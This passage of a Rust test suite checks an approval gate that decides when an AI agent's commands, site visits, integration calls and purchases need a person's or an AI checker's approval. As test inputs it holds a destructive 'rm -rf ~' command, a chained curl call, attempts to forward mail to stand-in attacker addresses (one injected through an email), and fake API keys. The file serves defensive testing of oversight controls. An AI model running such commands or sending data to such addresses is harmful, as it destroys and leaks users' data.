async fn a_prompt_that_goes_away_closes_its_request() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    bash(&a, &fake, "q1", "agent-browser open https://a.example").await;
    // A second prompt in the same run: the first was answered elsewhere.
    bash(&a, &fake, "q2", "agent-browser open https://b.example").await;
    assert_eq!(fake.request("Q1").state, RequestState::Denied);
    assert_eq!(fake.request("Q2").state, RequestState::Open);
    // The run ends.
    a.on_thread_event(&event("thread.interrupted", None)).await;
    let q2 = fake.request("Q2");
    assert_eq!(q2.state, RequestState::Denied);
    assert_eq!(q2.evidence.unwrap().as_str(), "expired: the run ended");
    assert!(fake.answers.lock().unwrap().is_empty());
}

#[tokio::test]
async fn an_integrations_read_runs_unasked_and_a_blocked_or_unshowable_call_is_refused_with_nothing_filed()
 {
    let fake = Arc::new(Fake::default());
    *fake.servers.lock().unwrap() = vec![crm()];
    let a = approvals(&fake);
    for (id, tool, input) in [
        (
            "q1",
            "mcp__crm__list_contacts",
            Some(json!({ "query": "dentist" })),
        ),
        (
            "q2",
            "mcp__crm__send_money",
            Some(json!({ "to": "bo@example.com", "amount": 50 })),
        ),
        // The node sent no input: the card could not show what approving it sends.
        ("q3", "mcp__crm__send_message", None),
    ] {
        *fake.pending.lock().unwrap() = Some(pending_with(id, tool, input));
        a.on_thread_event(&event("thread.waiting", Some(prompt(id, tool, "a call"))))
            .await;
    }
    assert!(requests(&fake).is_empty(), "nothing asks the person");
    let answers = fake.answers.lock().unwrap().clone();
    assert_eq!(answers.len(), 3);
    assert_eq!(
        answers[0].3,
        PermissionDecision::Allow {
            updated_input: None
        }
    );
    for (_, _, id, decision) in &answers[1..] {
        let PermissionDecision::Deny { message } = decision else {
            panic!("{id}: {decision:?}")
        };
        assert!(
            message.as_str().starts_with("Blocked by fleetd"),
            "{id}: {}",
            message.as_str()
        );
    }
}

/// A command prompt on the Navi's lead, its input as the node sends it.
async fn bash(a: &Arc<Approvals>, fake: &Fake, id: &str, command: &str) {
    *fake.pending.lock().unwrap() = Some(pending_with(
        id,
        "Bash",
        Some(json!({ "command": command })),
    ));
    a.on_thread_event(&event("thread.waiting", Some(prompt(id, "Bash", command))))
        .await;
}

fn fetch(id: &str, url: &str) -> (HubEvent, PendingPermission) {
    let input = json!({ "url": url, "prompt": "the opening hours" });
    (
        event("thread.waiting", Some(prompt(id, "WebFetch", url))),
        pending_with(id, "WebFetch", Some(input)),
    )
}

async fn prompted(
    a: &Arc<Approvals>,
    fake: &Fake,
    (event, pending): (HubEvent, PendingPermission),
) {
    *fake.pending.lock().unwrap() = Some(pending);
    a.on_thread_event(&event).await;
}

/// A Navi's first fetch to a site asks the person; approving it allows the site, so the next fetch there goes through
/// unasked; a site they revoke asks again.
#[tokio::test]
async fn a_navis_first_visit_to_a_site_asks_and_its_approval_allows_the_site() {
    let fake = Arc::new(Fake::default());
    *fake.navi.lock().unwrap() = true;
    let a = approvals(&fake);
    prompted(&a, &fake, fetch("q1", "https://www.dentist.example/hours")).await;
    let open = requests(&fake);
    assert_eq!(open.len(), 1, "the first visit asks");
    let permission = open[0].permission.as_ref().unwrap();
    assert_eq!(permission.site.as_deref(), Some("dentist.example"));
    let item = serde_json::to_value(chat_item(&open[0])).unwrap();
    assert_eq!(item["permission"]["site"], "dentist.example");
    a.answer(&person(), "Q1", true, None).await.unwrap();
    assert_eq!(
        fake.sites.lock().unwrap().as_slice(),
        [("dentist.example".to_owned(), "human:desk".to_owned())]
    );
    assert_eq!(fake.answers.lock().unwrap().len(), 1);

    // The same site again, another page: allowed at once, nothing filed.
    prompted(&a, &fake, fetch("q2", "https://dentist.example/book")).await;
    assert_eq!(requests(&fake).len(), 1, "a second visit doesn't ask");
    let answers = fake.answers.lock().unwrap().clone();
    assert_eq!(
        (answers[1].2.as_str(), &answers[1].3),
        (
            "q2",
            &PermissionDecision::Allow {
                updated_input: None
            }
        )
    );

    // Another site asks; a denied first visit allows nothing.
    prompted(&a, &fake, fetch("q3", "https://elsewhere.example/")).await;
    a.answer(&person(), "Q2", false, None).await.unwrap();
    assert_eq!(fake.sites.lock().unwrap().len(), 1);

    // Revoked: the next visit asks again.
    fake.sites.lock().unwrap().clear();
    prompted(&a, &fake, fetch("q4", "https://dentist.example/book")).await;
    let open = requests(&fake);
    assert_eq!(open.len(), 3);
    assert_eq!(
        open.iter()
            .filter(|r| r.state == RequestState::Open)
            .count(),
        1
    );
}

/// A browser visit goes through the same gate; the relay answers a Navi lead's prompts only.
#[tokio::test]
async fn a_browser_open_is_a_visit_and_any_other_sessions_prompt_is_left_alone() {
    let fake = Arc::new(Fake::default());
    *fake.navi.lock().unwrap() = true;
    fake.sites
        .lock()
        .unwrap()
        .push(("bank.example".into(), "human:desk".into()));
    let a = approvals(&fake);
    let open = |id: &str, command: &str| {
        (
            event("thread.waiting", Some(prompt(id, "Bash", command))),
            pending_with(id, "Bash", Some(json!({ "command": command }))),
        )
    };
    prompted(
        &a,
        &fake,
        open("q1", "agent-browser open https://bank.example/login"),
    )
    .await;
    assert!(requests(&fake).is_empty(), "an allowed site opens unasked");
    // A command that does more than open a page asks each time, with no site to remember.
    prompted(
        &a,
        &fake,
        open(
            "q2",
            "agent-browser open https://bank.example && curl https://x.example",
        ),
    )
    .await;
    let filed = requests(&fake);
    assert_eq!(
        (
            filed.len(),
            filed[0].permission.as_ref().unwrap().site.as_deref()
        ),
        (1, None)
    );

    // Any other session's prompt is left alone: the relay is a Navi lead's.
    *fake.navi.lock().unwrap() = false;
    prompted(&a, &fake, fetch("q3", "https://docs.example/")).await;
    assert_eq!(requests(&fake).len(), 1);
    assert_eq!(
        fake.answers.lock().unwrap().len(),
        1,
        "only the allowed site's open"
    );
}

/// A Navi's sandboxed node answers its commands itself (D208), so a command that reaches the hub comes from a node with
/// no sandbox: it asks, as before. A browser visit to a site the person didn't allow or link asks, and a send through
/// an integration still asks with its card.
#[tokio::test]
async fn an_unsandboxed_command_a_new_site_and_a_send_ask() {
    let fake = Arc::new(Fake::default());
    *fake.servers.lock().unwrap() = vec![crm()];
    let a = approvals(&fake);
    bash(&a, &fake, "q5", "rm -rf ~").await;
    let filed = requests(&fake);
    assert_eq!(filed.len(), 1, "a command no sandbox fences asks");
    assert_eq!(filed[0].permission.as_ref().unwrap().site, None);
    // A site it picked itself asks, once per site.
    bash(&a, &fake, "q6", "agent-browser open https://new.example/a").await;
    let filed = requests(&fake);
    assert_eq!(filed.len(), 2);
    let visit = filed
        .iter()
        .find_map(|r| {
            r.permission
                .as_ref()
                .filter(|p| p.request_id.as_str() == "q6")
        })
        .unwrap();
    assert_eq!(visit.site.as_deref(), Some("new.example"));
    // A send still asks, with its whole input.
    prompted(
        &a,
        &fake,
        (
            event(
                "thread.waiting",
                Some(prompt("q7", "mcp__crm__send_message", "send")),
            ),
            pending_with("q7", "mcp__crm__send_message", Some(send_input())),
        ),
    )
    .await;
    let filed = requests(&fake);
    assert_eq!(filed.len(), 3);
    let send = filed
        .iter()
        .find_map(|r| {
            r.permission
                .as_ref()
                .filter(|p| p.request_id.as_str() == "q7")
        })
        .unwrap();
    let preview = serde_json::to_value(&send.preview).unwrap();
    assert!(
        preview["input"]
            .as_str()
            .unwrap()
            .contains("ana@example.com")
    );
    assert!(fake.answers.lock().unwrap().is_empty());
}

/// A prompt whose input the node didn't send (over 64 KiB) can't be shown, so it is refused rather than approved blind.
#[tokio::test]
async fn a_prompt_whose_input_cant_be_shown_is_refused() {
    let fake = Arc::new(Fake::default());
    let a = approvals(&fake);
    a.on_thread_event(&event(
        "thread.waiting",
        Some(prompt("q1", "Bash", "a long command")),
    ))
    .await;
    assert!(requests(&fake).is_empty());
    let answers = fake.answers.lock().unwrap().clone();
    let PermissionDecision::Deny { message } = &answers[0].3 else {
        panic!("{answers:?}")
    };
    assert!(
        message.as_str().starts_with("Blocked by fleetd"),
        "{}",
        message.as_str()
    );
}

/// A Navi's custom server named `name`, with the tools the person marked as reads.
fn integration(name: &str, reads: &[&str]) -> fleetd_contracts::mcp_servers::McpServer {
    serde_json::from_value(json!({
        "scope": { "kind": "project", "machineId": "lab-a", "projectId": "p1" },
        "name": name, "enabled": true,
        "roles": { "lead": true, "writers": false, "reviewers": false },
        "transport": { "type": "http", "url": "https://mcp.example.com/mcp" },
        "integration": { "readTools": reads },
        "updatedAt": "2026-10-27T00:00:00Z"
    }))
    .unwrap()
}

#[tokio::test]
async fn through_the_relay_a_custom_server_gets_its_policy() {
    let fake = Arc::new(Fake::default());
    *fake.servers.lock().unwrap() = vec![
        crm(),
        // As an older hub kept it: the kind it was marked with is no matter.
        serde_json::from_value(json!({
            "scope": { "kind": "project", "machineId": "lab-a", "projectId": "p1" },
            "name": "docs", "enabled": true,
            "roles": { "lead": true, "writers": false, "reviewers": false },
            "transport": { "type": "http", "url": "https://docs.example.com/mcp" },
            "integration": { "kind": "custom", "readTools": ["search_pages"] },
            "updatedAt": "2026-10-27T00:00:00Z"
        }))
        .unwrap(),
    ];
    let a = approvals(&fake);
    for (id, tool, input) in [
        // A tool the person marked as a read: unasked.
        ("q1", "mcp__crm__list_contacts", json!({})),
        // Its money tool: blocked, whatever was marked.
        ("q2", "mcp__crm__transfer_funds", json!({ "amount": 50 })),
        // A delete: asks as a delete.
        ("q3", "mcp__crm__delete_contact", json!({ "id": "c9" })),
        // A key in what it would send: refused as a key.
        (
            "q4",
            "mcp__crm__send_message",
            json!({ "to": ["ana@example.com"], "body": "token = ghp_abcdefghijklmnopqrstuvwxyz0123" }),
        ),
        ("q5", "mcp__docs__search_pages", json!({ "query": "lease" })),
    ] {
        *fake.pending.lock().unwrap() = Some(pending_with(id, tool, Some(input)));
        a.on_thread_event(&event("thread.waiting", Some(prompt(id, tool, "a call"))))
            .await;
    }
    let answers = fake.answers.lock().unwrap().clone();
    let decided: Vec<(&str, &PermissionDecision)> = answers
        .iter()
        .map(|(_, _, id, d)| (id.as_str(), d))
        .collect();
    assert_eq!(decided.len(), 4, "{decided:?}");
    for id in ["q1", "q5"] {
        assert_eq!(
            decided.iter().find(|(i, _)| *i == id).unwrap().1,
            &PermissionDecision::Allow {
                updated_input: None
            },
            "{id}"
        );
    }
    for (id, why) in [
        ("q2", "moves money"),
        ("q4", "looks like a password, key or token"),
    ] {
        let (_, PermissionDecision::Deny { message }) =
            decided.iter().find(|(i, _)| *i == id).unwrap()
        else {
            panic!("{id} wasn't denied")
        };
        assert!(message.as_str().contains(why), "{id}: {}", message.as_str());
    }

    // One card waits for the person: the delete.
    let open = requests(&fake);
    assert_eq!(open.len(), 1);
    let card =
        |r: &HumanRequest| serde_json::to_value(&r.permission.as_ref().unwrap().preview).unwrap();
    assert_eq!(open[0].permission.as_ref().unwrap().request_id, "q3");
    assert_eq!(card(&open[0])["action"], "delete");
    assert_eq!(card(&open[0])["title"], "Use delete_contact on crm");
}

fn purchase_call(session: &str) -> fleetd_contracts::purchase::PurchaseOpenCall {
    serde_json::from_value(json!({
        "sessionId": session,
        "page": "https://hotel.devbox.test/checkout",
        "purchase": {
            "shop": { "domain": "hotel.devbox.test", "name": "Hotel Devbox" },
            "total": { "amount": "129.90", "currency": "EUR" },
            "items": [{ "name": "Double room, 2 nights", "quantity": 1, "amount": "129.90" }],
        },
    }))
    .unwrap()
}

fn visa() -> fleetd_contracts::purchase::NaviCard {
    serde_json::from_value(json!({ "ref": "op://Personal/Visa" })).unwrap()
}

fn approvals_at(
    fake: &Arc<Fake>,
    clock: Arc<crate::hub::store::test_clock::ManualClock>,
) -> Arc<Approvals> {
    Approvals::new(ApprovalsDeps {
        requests: fake.requests.clone(),
        nodes: fake.clone(),
        hub: fake.clone(),
        events: fake.clone(),
        clock,
    })
}

const B1: &str = "B0123456789abcdef0123456789abcdef";

/// A Navi's purchase is a request of its own class: it opens a card with the shop, the total, the items and the card,
/// only a person answers it, and approved it is filled once, by the session that asked, within its window.
#[tokio::test]
async fn a_purchase_always_asks_a_person_and_its_card_fills_once_within_its_window() {
    use fleetd_contracts::browser::BrowserSessionId;
    let fake = Arc::new(Fake::default());
    let clock = crate::hub::store::test_clock::ManualClock::at(1_790_000_000_000);
    let a = approvals_at(&fake, clock.clone());
    let open = a
        .open_purchase(&p1(), purchase_call(B1), visa())
        .await
        .unwrap();
    assert_eq!(open.state, RequestState::Open);
    assert_eq!(
        open.text.as_str(),
        "Pay 129.90 EUR at Hotel Devbox (hotel.devbox.test) with Visa (Personal)"
    );
    assert!(
        purchases::person_only(&open),
        "no mode, checker or rule answers it"
    );
    let ChatItem::CommandApproval(item) = chat_item(&open) else {
        panic!("a purchase shows as an approval");
    };
    let shown = item.purchase.expect("the card shows the purchase");
    assert_eq!(shown.shop.domain.as_str(), "hotel.devbox.test");
    assert_eq!(shown.card.label(), "Visa (Personal)");
    assert!(item.gated.is_none() && item.permission.is_none());
    let session = BrowserSessionId::unchecked(B1);

    // Unanswered: nothing fills it. Nor does a key that isn't a person's.
    let early = a
        .claim_purchase(&p1(), &open.request_id, &session)
        .await
        .unwrap_err();
    assert!(early.message.contains("hasn't answered"), "{early:?}");
    let by_agent = a.answer(&agent(), "Q1", true, None).await.unwrap_err();
    assert_eq!(by_agent.code, "forbidden");

    // Approved: the Navi is woken, and runs nothing here.
    let approved = a.answer(&person(), "Q1", true, None).await.unwrap();
    assert_eq!(approved.state, RequestState::Approved);
    assert_eq!(*fake.woken.lock().unwrap(), ["Q1 approved"]);
    assert!(fake.runs.lock().unwrap().is_empty());

    // Another browser session can't fill it.
    let other = BrowserSessionId::unchecked("Bffffffffffffffffffffffffffffffff");
    let wrong = a
        .claim_purchase(&p1(), &open.request_id, &other)
        .await
        .unwrap_err();
    assert_eq!(wrong.code, "forbidden");

    // A fill that typed nothing gives the claim back; one that typed fills it for good.
    let claimed = a
        .claim_purchase(&p1(), &open.request_id, &session)
        .await
        .unwrap();
    assert_eq!(
        (claimed.domain.as_str(), claimed.card.as_str()),
        ("hotel.devbox.test", "op://Personal/Visa")
    );
    let twice = a
        .claim_purchase(&p1(), &open.request_id, &session)
        .await
        .unwrap_err();
    assert!(twice.message.contains("fills once"), "{twice:?}");
    let untyped = serde_json::from_value(json!({
        "requestId": "Q1", "ok": false, "typed": false, "message": "no card number field on the checkout",
    }))
    .unwrap();
    let back = a.purchase_filled(&p1(), untyped).await.unwrap();
    assert_eq!(back.state, RequestState::Approved);
    a.claim_purchase(&p1(), &open.request_id, &session)
        .await
        .unwrap();
    let typed = serde_json::from_value(json!({
        "requestId": "Q1", "ok": true, "typed": true, "message": "the card's number, expiry, security code",
    }))
    .unwrap();
    let done = a.purchase_filled(&p1(), typed).await.unwrap();
    assert_eq!(done.state, RequestState::Ran);
    assert!(done.purchase.unwrap().filled_at.is_some());
    let again = a
        .claim_purchase(&p1(), &open.request_id, &session)
        .await
        .unwrap_err();
    assert!(again.message.contains("fills once"), "{again:?}");

    // Past its window, an approval fills nothing and ends.
    let late = a
        .open_purchase(&p1(), purchase_call(B1), visa())
        .await
        .unwrap();
    a.answer(&person(), late.request_id.as_str(), true, None)
        .await
        .unwrap();
    clock.advance(std::time::Duration::from_secs(
        60 * fleetd_contracts::purchase::FILL_WINDOW_MINUTES as u64 + 1,
    ));
    let expired = a
        .claim_purchase(&p1(), &late.request_id, &session)
        .await
        .unwrap_err();
    assert!(expired.message.contains("expired"), "{expired:?}");
    assert_eq!(
        fake.request(late.request_id.as_str()).state,
        RequestState::Failed
    );

    // Approved and never filled: once its window ran out it ends as failed, not "approved" for ever.
    let idle = a
        .open_purchase(&p1(), purchase_call(B1), visa())
        .await
        .unwrap();
    a.answer(&person(), idle.request_id.as_str(), true, None)
        .await
        .unwrap();
    a.expire_unfilled().await;
    assert_eq!(
        fake.request(idle.request_id.as_str()).state,
        RequestState::Approved,
        "still in its window"
    );
    clock.advance(std::time::Duration::from_secs(
        60 * fleetd_contracts::purchase::FILL_WINDOW_MINUTES as u64 + 1,
    ));
    a.expire_unfilled().await;
    let ended = fake.request(idle.request_id.as_str());
    assert_eq!(ended.state, RequestState::Failed);
    assert!(ended.evidence.unwrap().as_str().starts_with("expired"));

    // Denied: the Navi hears it, and nothing fills it.
    let no = a
        .open_purchase(&p1(), purchase_call(B1), visa())
        .await
        .unwrap();
    a.answer(
        &person(),
        no.request_id.as_str(),
        false,
        Some("too dear".into()),
    )
    .await
    .unwrap();
    assert!(
        fake.woken
            .lock()
            .unwrap()
            .contains(&format!("{} denied", no.request_id))
    );
    let denied = a
        .claim_purchase(&p1(), &no.request_id, &session)
        .await
        .unwrap_err();
    assert!(denied.message.contains("is denied"), "{denied:?}");
    // Another project's purchase is none of this one's.
    let elsewhere = ProjectRef {
        machine_id: "lab-a".into(),
        project_id: "p2".into(),
    };
    let foreign = a
        .claim_purchase(&elsewhere, &open.request_id, &session)
        .await
        .unwrap_err();
    assert_eq!(foreign.code, "not_found");
}

/// What only a person may answer, in every approval mode (ask_all, checker, yolo): a purchase, an MCP tool that spends,
/// and a command of a payment CLI. Anything else a mode may decide.
#[test]
fn purchases_spending_tools_and_payment_clis_are_the_persons_alone() {
    let mut r = Fake::default().stored();
    assert!(!purchases::person_only(&r), "ls is not a purchase");
    for program in ["stripe", "/usr/local/bin/stripe", "shopify", "link-cli"] {
        r.gated = Some(
            serde_json::from_value(json!({ "argv": [program, "charges", "create"], "cwd": "/w/p1", "class": "irreversible", "reason": "x", "timeoutSec": 60 }))
                .unwrap(),
        );
        assert!(purchases::person_only(&r), "{program}");
    }
    r.gated = Some(
        serde_json::from_value(json!({ "argv": ["curl", "-X", "POST", "https://api.devbox.test/pay"], "cwd": "/w/p1", "class": "money", "reason": "x", "timeoutSec": 60 }))
            .unwrap(),
    );
    assert!(purchases::person_only(&r), "a command classed money");
    r.gated = None;
    let spend = crate::hub::integrations::policy::preview(
        "flights",
        "create_order",
        crate::hub::integrations::policy::guess("create_order"),
        &json!({ "flight": "LH 123" }),
    )
    .unwrap();
    r.permission = Some(
        serde_json::from_value(json!({
            "threadId": "t1", "requestId": "p-1", "toolName": "mcp__flights__create_order", "summary": "",
            "preview": spend,
        }))
        .unwrap(),
    );
    assert!(
        purchases::person_only(&r),
        "an MCP tool that makes an order spends"
    );
}

/// A Navi's send through its CRM, as its session asks for it.
async fn send(a: &Arc<Approvals>, fake: &Fake, id: &str, tool: &str, input: Value) {
    *fake.pending.lock().unwrap() = Some(pending_with(id, tool, Some(input)));
    a.on_thread_event(&event("thread.waiting", Some(prompt(id, tool, "a call"))))
        .await;
    a.checks_done().await;
}

fn checker_navi(mode: NaviApprovalMode) -> Arc<Fake> {
    let fake = Arc::new(Fake::default());
    *fake.servers.lock().unwrap() = vec![crm()];
    *fake.mode.lock().unwrap() = mode;
    fake
}

fn allowed(decision: &PermissionDecision) -> bool {
    matches!(decision, PermissionDecision::Allow { .. })
}

/// Checker go: the send runs with nobody asked, and the person sees one quiet line saying why.
#[tokio::test]
async fn the_checkers_go_runs_the_action_with_a_quiet_line_and_nothing_asks() {
    let fake = checker_navi(NaviApprovalMode::Checker);
    *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Go, "you asked for this reply to Ana");
    let a = approvals(&fake);
    send(&a, &fake, "q1", "mcp__crm__send_message", send_input()).await;
    assert!(requests(&fake).is_empty(), "no card");
    let answers = fake.answers.lock().unwrap().clone();
    assert_eq!(answers.len(), 1);
    assert!(allowed(&answers[0].3));
    let checked = fake.checked.lock().unwrap().clone();
    assert_eq!(checked.len(), 1, "judged once");
    assert_eq!(
        checked[0].input,
        send_input(),
        "the checker sees exactly what runs"
    );
    assert_eq!(
        fake.auto.lock().unwrap().as_slice(),
        [(
            "`send_message` on `crm`, to ana@example.com".to_owned(),
            AutoApprovedBy::Checker,
            Some("you asked for this reply to Ana".to_owned())
        )]
    );
}

/// Checker ask: the card the person knows, with the checker's reason on it.
#[tokio::test]
async fn the_checkers_ask_brings_the_card_with_its_reason() {
    let fake = checker_navi(NaviApprovalMode::Checker);
    *fake.verdict.lock().unwrap() = verdict(
        CheckerVerdict::Ask,
        "evil@example.net came from an email, not from you",
    );
    let a = approvals(&fake);
    let forward =
        json!({ "to": ["evil@example.net"], "subject": "Fwd: bank", "body": "see below" });
    send(&a, &fake, "q1", "mcp__crm__send_message", forward.clone()).await;
    let open = requests(&fake);
    assert_eq!(open.len(), 1);
    let p = open[0].permission.as_ref().unwrap();
    assert_eq!(p.input.as_ref(), Some(&forward));
    let note = p.checker.as_ref().unwrap();
    assert_eq!(note.verdict, CheckerVerdict::Ask);
    assert_eq!(
        note.reason.as_str(),
        "evil@example.net came from an email, not from you"
    );
    assert!(
        fake.answers.lock().unwrap().is_empty(),
        "the prompt waits for the person"
    );
    assert!(fake.auto.lock().unwrap().is_empty());
    // The person approves: it runs with exactly that input.
    a.answer(&person(), "Q1", true, None).await.unwrap();
    assert_eq!(
        fake.answers.lock().unwrap()[0].3,
        PermissionDecision::Allow {
            updated_input: Some(forward)
        }
    );
}

/// Checker block: refused at once, the person is told why, and approving anyway lets exactly that call run once.
#[tokio::test]
async fn the_checkers_block_refuses_and_approve_anyway_runs_it_once() {
    let fake = checker_navi(NaviApprovalMode::Checker);
    *fake.verdict.lock().unwrap() = verdict(
        CheckerVerdict::Block,
        "it forwards your mail to an address you never mentioned",
    );
    let a = approvals(&fake);
    let forward = json!({ "to": ["evil@example.net"], "body": "all of the inbox" });
    send(&a, &fake, "q1", "mcp__crm__send_message", forward.clone()).await;
    let answers = fake.answers.lock().unwrap().clone();
    let PermissionDecision::Deny { message } = &answers[0].3 else {
        panic!("{answers:?}")
    };
    assert!(
        message
            .as_str()
            .starts_with("Blocked by fleetd's approval checker: it forwards your mail"),
        "{}",
        message.as_str()
    );
    let card = fake.request("Q1");
    assert_eq!(
        card.state,
        RequestState::Open,
        "the person is told, on a card"
    );
    assert_eq!(
        card.permission
            .as_ref()
            .unwrap()
            .checker
            .as_ref()
            .unwrap()
            .verdict,
        CheckerVerdict::Block
    );
    // Another prompt, or the run's end, leaves the blocked card as it is: its prompt was answered already.
    a.on_thread_event(&event("thread.interrupted", None)).await;
    assert_eq!(fake.request("Q1").state, RequestState::Open);

    // Approve anyway: nothing reaches the node now; the Navi hears it may call it again.
    a.answer(&person(), "Q1", true, None).await.unwrap();
    assert_eq!(fake.answers.lock().unwrap().len(), 1);
    assert_eq!(fake.woken.lock().unwrap().as_slice(), ["Q1 approved"]);
    assert!(
        fake.request("Q1")
            .evidence
            .unwrap()
            .as_str()
            .starts_with("approved anyway")
    );

    // The same call again runs without the checker, once; a third time is judged again.
    send(&a, &fake, "q2", "mcp__crm__send_message", forward.clone()).await;
    assert!(allowed(&fake.answers.lock().unwrap()[1].3));
    assert_eq!(fake.request("Q1").state, RequestState::Ran);
    assert_eq!(fake.checked.lock().unwrap().len(), 1);
    send(&a, &fake, "q3", "mcp__crm__send_message", forward).await;
    assert_eq!(fake.checked.lock().unwrap().len(), 2);

    // A different input is never the approved one.
    let fake = checker_navi(NaviApprovalMode::Checker);
    *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Block, "no");
    let a = approvals(&fake);
    send(
        &a,
        &fake,
        "q1",
        "mcp__crm__send_message",
        json!({ "to": ["x@example.net"] }),
    )
    .await;
    a.answer(&person(), "Q1", true, None).await.unwrap();
    send(
        &a,
        &fake,
        "q2",
        "mcp__crm__send_message",
        json!({ "to": ["y@example.net"] }),
    )
    .await;
    assert_eq!(fake.checked.lock().unwrap().len(), 2);
    assert_eq!(fake.request("Q1").state, RequestState::Approved);
}

/// The checker answered after the prompt went away (answered elsewhere, its run ended): nothing runs, nothing asks.
#[tokio::test]
async fn a_verdict_on_a_prompt_gone_meanwhile_does_nothing() {
    let fake = checker_navi(NaviApprovalMode::Checker);
    *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Go, "fine");
    let a = approvals(&fake);
    *fake.pending.lock().unwrap() = Some(pending_with(
        "q1",
        "mcp__crm__send_message",
        Some(send_input()),
    ));
    let waiting = event(
        "thread.waiting",
        Some(prompt("q1", "mcp__crm__send_message", "a call")),
    );
    a.on_thread_event(&waiting).await;
    *fake.pending.lock().unwrap() = None;
    a.checks_done().await;
    assert!(fake.answers.lock().unwrap().is_empty());
    assert!(fake.auto.lock().unwrap().is_empty());
    assert!(requests(&fake).is_empty());
}

/// Checker go on a first visit allows the site, as the person's approval would.
#[tokio::test]
async fn the_checkers_go_on_a_first_visit_allows_its_site() {
    let fake = checker_navi(NaviApprovalMode::Checker);
    *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Go, "you asked for its hours");
    let a = approvals(&fake);
    prompted(&a, &fake, fetch("q1", "https://dentist.example/hours")).await;
    a.checks_done().await;
    assert!(requests(&fake).is_empty());
    assert_eq!(
        fake.sites.lock().unwrap().as_slice(),
        [("dentist.example".to_owned(), "checker".to_owned())]
    );
    assert_eq!(fake.auto.lock().unwrap()[0].0, "Fetch `dentist.example`");
}

/// Ask me about everything: a card for every risky action, and the checker never runs.
#[tokio::test]
async fn ask_mode_brings_a_card_for_every_risky_action_without_the_checker() {
    let fake = checker_navi(NaviApprovalMode::Ask);
    *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Go, "would go");
    let a = approvals(&fake);
    send(&a, &fake, "q1", "mcp__crm__send_message", send_input()).await;
    prompted(&a, &fake, fetch("q2", "https://dentist.example/hours")).await;
    a.checks_done().await;
    assert!(fake.checked.lock().unwrap().is_empty());
    assert!(fake.auto.lock().unwrap().is_empty());
    assert_eq!(requests(&fake).len(), 2);
    assert!(
        requests(&fake)
            .iter()
            .all(|r| r.permission.as_ref().unwrap().checker.is_none())
    );
}

/// YOLO: every risky action runs with no card and no checker, and each is logged (with no line in the chat).
#[tokio::test]
async fn yolo_runs_every_risky_action_unasked_and_logs_each() {
    let fake = checker_navi(NaviApprovalMode::Yolo);
    let a = approvals(&fake);
    send(&a, &fake, "q1", "mcp__crm__send_message", send_input()).await;
    prompted(&a, &fake, fetch("q2", "https://dentist.example/hours")).await;
    a.checks_done().await;
    assert!(requests(&fake).is_empty());
    assert!(fake.checked.lock().unwrap().is_empty());
    let answers = fake.answers.lock().unwrap().clone();
    assert_eq!(answers.len(), 2);
    assert!(answers.iter().all(|a| allowed(&a.3)));
    let auto = fake.auto.lock().unwrap().clone();
    assert_eq!(auto.len(), 2);
    assert!(
        auto.iter()
            .all(|(_, by, reason)| *by == AutoApprovedBy::Yolo && reason.is_none())
    );
}

/// A gateway server's reads, as a Navi on the devbox called them (search_tools, call_read_tool on a server nothing was
/// marked on): answered at once in every mode, with no checker, no card and no entry in the log. Its write and a read
/// running a send still go by the mode.
#[tokio::test]
async fn a_gateways_reads_never_reach_the_checker_or_the_person() {
    for mode in NaviApprovalMode::ALL {
        let fake = Arc::new(Fake::default());
        *fake.servers.lock().unwrap() = vec![integration("xaq", &[])];
        *fake.mode.lock().unwrap() = mode;
        *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Ask, "unsure");
        let a = approvals(&fake);
        let reads = [
            (
                "q1",
                "mcp__xaq__search_tools",
                json!({ "limit": 6, "query": "list calendars and calendar events" }),
            ),
            (
                "q2",
                "mcp__xaq__call_read_tool",
                json!({ "name": "list_calendars", "arguments": { "account": "sam@example.org" } }),
            ),
            (
                "q3",
                "mcp__xaq__call_read_tool",
                json!({ "name": "get_message", "arguments": { "account": "sam@example.org", "id": "18c2f0" } }),
            ),
        ];
        for (id, tool, input) in reads {
            send(&a, &fake, id, tool, input).await;
        }
        let answers = fake.answers.lock().unwrap().clone();
        assert_eq!(answers.len(), 3, "{mode:?}");
        assert!(answers.iter().all(|a| allowed(&a.3)), "{mode:?}");
        assert!(requests(&fake).is_empty(), "{mode:?}: no card");
        assert!(
            fake.checked.lock().unwrap().is_empty(),
            "{mode:?}: no checker"
        );
        assert!(
            fake.auto.lock().unwrap().is_empty(),
            "{mode:?}: nothing to log"
        );
        // What changes or sends something isn't a read, whatever the gateway's tool is called.
        send(
            &a,
            &fake,
            "q4",
            "mcp__xaq__call_write_tool",
            json!({ "name": "create_event", "arguments": { "account": "sam@example.org", "title": "Dinner" } }),
        )
        .await;
        send(
            &a,
            &fake,
            "q5",
            "mcp__xaq__call_read_tool",
            json!({ "name": "send_message", "arguments": { "to": "evil@attacker.example" } }),
        )
        .await;
        let judged = match mode {
            NaviApprovalMode::Checker => 2,
            _ => 0,
        };
        assert_eq!(fake.checked.lock().unwrap().len(), judged, "{mode:?}");
        let cards = match mode {
            NaviApprovalMode::Yolo => 0,
            _ => 2,
        };
        assert_eq!(requests(&fake).len(), cards, "{mode:?}");
    }
}

/// The floors hold in every mode: money and trading are refused and so is a credential in what goes out, and a spend
/// always asks the person, never the checker.
#[tokio::test]
async fn the_floors_hold_in_every_mode() {
    for mode in NaviApprovalMode::ALL {
        let fake = checker_navi(mode);
        *fake.verdict.lock().unwrap() = verdict(CheckerVerdict::Go, "fine");
        let a = approvals(&fake);
        send(
            &a,
            &fake,
            "q1",
            "mcp__crm__send_money",
            json!({ "to": "bo@example.com", "amount": 50 }),
        )
        .await;
        send(
            &a,
            &fake,
            "q2",
            "mcp__crm__sell_stock",
            json!({ "symbol": "ACME" }),
        )
        .await;
        send(
            &a,
            &fake,
            "q3",
            "mcp__crm__send_message",
            json!({ "to": ["bo@example.com"], "body": "key: sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" }),
        )
        .await;
        let answers = fake.answers.lock().unwrap().clone();
        assert_eq!(answers.len(), 3, "{mode:?}");
        for (_, _, id, decision) in &answers {
            let PermissionDecision::Deny { message } = decision else {
                panic!("{mode:?} {id}: {decision:?}")
            };
            assert!(
                message.as_str().starts_with("Blocked by fleetd"),
                "{mode:?} {id}"
            );
        }
        // A spend: always the person's card, never the checker, in YOLO too.
